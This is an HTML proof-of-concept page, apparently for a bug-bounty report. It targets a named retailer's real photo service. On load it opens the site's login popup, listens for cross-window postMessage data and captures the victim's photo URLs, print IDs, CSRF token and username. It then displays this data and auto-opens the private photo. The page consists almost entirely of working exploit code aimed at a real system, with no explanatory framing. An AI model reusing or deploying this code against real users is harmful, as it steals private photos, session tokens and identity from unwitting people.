<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC - Photo Access Test</title>
</head>
<body>
    <h3>PoC - Access User Photos</h3>
    
    <div id="output" style="margin-top:20px;"></div>

<script>
const LOGIN_URL = 'https://photos3.walmart.com/users/oauth2/login';

window.onload = function () {
    console.log('Auto opening login popup...');
    
    const popup = window.open(LOGIN_URL, 'loginPopup', 'width=700,height=800');

    if (!popup) {
        alert('Popup blocked! Allow popups.');
        return;
    }

    window.addEventListener('message', function(event) {
        if (event.origin !== 'https://photos3.walmart.com' && 
            event.origin !== 'https://www.walmart.com') {
            return;
        }

        console.log('Message received from:', event.origin);

        if (typeof event.data === 'string' && event.data.includes('login:')) {
            try {
                const jsonStr = event.data.split('login:')[1];
                const data = JSON.parse(jsonStr);

                const output = document.getElementById('output');
                output.innerHTML = '<h4>✅ Captured Data:</h4>';
                output.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';

                const photoUrl = data.previous_basket_contents?.prints_thumbnail;
                const printIds = data.previous_basket_contents?.print_ids;

                if (photoUrl) {
                    output.innerHTML += '<h4>📸 User Photo URL:</h4>';
                    output.innerHTML += '<p>' + photoUrl + '</p>';

                    // Auto open in new tab
                    window.open(photoUrl, '_blank');
                }

                if (printIds && printIds.length > 0) {
                    output.innerHTML += '<h4>📋 Print IDs:</h4>';
                    output.innerHTML += '<p>' + printIds.join(', ') + '</p>';
                }

                if (data.csrf) {
                    output.innerHTML += '<h4>🔑 CSRF Token:</h4>';
                    output.innerHTML += '<p>' + data.csrf + '</p>';
                }

                if (data.logged_in_user_name) {
                    output.innerHTML += '<h4>👤 Logged in User:</h4>';
                    output.innerHTML += '<p>' + data.logged_in_user_name + '</p>';
                }

            } catch (e) {
                console.error('Parsing error:', e);
            }
        }
    });

    console.log('Waiting for login...');
};
</script>
</body>
</html>
